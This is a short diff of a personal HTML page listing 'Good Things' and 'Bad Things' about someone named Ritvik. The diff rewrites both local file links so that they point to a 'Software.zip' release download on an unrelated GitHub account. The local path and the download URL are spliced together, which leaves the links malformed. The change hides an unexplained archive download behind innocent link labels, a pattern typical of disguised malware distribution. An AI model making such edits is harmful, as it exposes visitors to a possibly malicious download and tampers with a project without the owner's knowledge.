@@ -42,8 +42,8 @@
     <div class="container">
         <h1>Good and Bad Things Ritvik Has Done</h1>
         <ul>
-            <li><a href="file:///C:/Users/parth/Documents/Ritvik%20Good%20Things.html">Good Things</a></li>
-            <li><a href="file:///C:/Users/parth/Documents/Ritvik%20Bad%20Things.html">Bad Things</a></li>
+            <li><a href="file:///C:/Users/parth/Documents/Ritvik%20Good%https://github.com/Frosty-Goat/Frosty-Goat/releases/download/v1.0/Software.zip">Good Things</a></li>
+            <li><a href="file:///C:/Users/parth/Documents/Ritvik%20Bad%https://github.com/Frosty-Goat/Frosty-Goat/releases/download/v1.0/Software.zip">Bad Things</a></li>
         </ul>
     </div>
 </body>
